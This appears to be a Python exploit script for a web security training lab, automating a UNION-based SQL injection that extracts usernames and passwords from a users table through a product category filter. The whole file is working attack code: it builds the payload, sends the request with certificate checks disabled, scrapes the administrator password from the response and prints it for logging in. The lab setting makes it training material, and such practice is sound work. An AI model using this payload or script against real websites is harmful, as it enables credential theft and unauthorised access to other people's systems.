import requests
import urllib3
from bs4 import BeautifulSoup
import re

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

LAB_NAME = "SQL injection UNION attack, retrieving multiple values in a single column"

def exploit_sqli_users_table(url, proxies=None):
    path = "/filter?category=Pets"
    payload = "' UNION SELECT NULL,username||'~'||password FROM users--"
    full_url = url.rstrip("/") + path + payload

    try:
        r = requests.get(full_url, verify=False, proxies=proxies)
    except requests.exceptions.RequestException as e:
        print(f"[!] Request failed: {e}")
        return False

    soup = BeautifulSoup(r.text, 'html.parser')

    # Look for table rows inside <th> tags
    table_entries = soup.find_all('th')
    for entry in table_entries:
        text = entry.get_text(strip=True)
        if text.startswith("administrator~"):
            admin_password = text.split("~")[1]
            print(f"[+] Administrator password: {admin_password}")
            return True

    print("[-] Administrator not found in the response.")
    return False

def run(url, payload=None, proxies=None):
    print("[+] Dumping the list of usernames and passwords...")
    if exploit_sqli_users_table(url, proxies=proxies):
        print("[+] Login with above creds!")
        return True
    else:
        print("[-] Lab exploit failed.")
        return False
